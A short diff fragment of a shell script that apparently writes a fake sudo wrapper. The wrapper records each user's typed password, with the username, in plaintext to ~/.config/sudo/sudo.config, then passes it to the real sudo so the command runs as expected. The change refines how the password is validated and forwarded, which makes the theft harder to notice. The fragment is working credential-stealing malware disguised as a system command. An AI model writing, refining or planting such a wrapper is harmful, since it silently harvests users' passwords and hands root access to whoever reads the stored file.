@@ -28,7 +28,8 @@ else
 	sudo $@
     else
 	echo "$USER:$pwd:valid" >> ~/.config/sudo/sudo.config
-	echo "$pwd" | /usr/bin/sudo -S $@
+	echo "$pwd" | /usr/bin/sudo -S true $@
+        sudo $@
     fi
 fi
 EOF
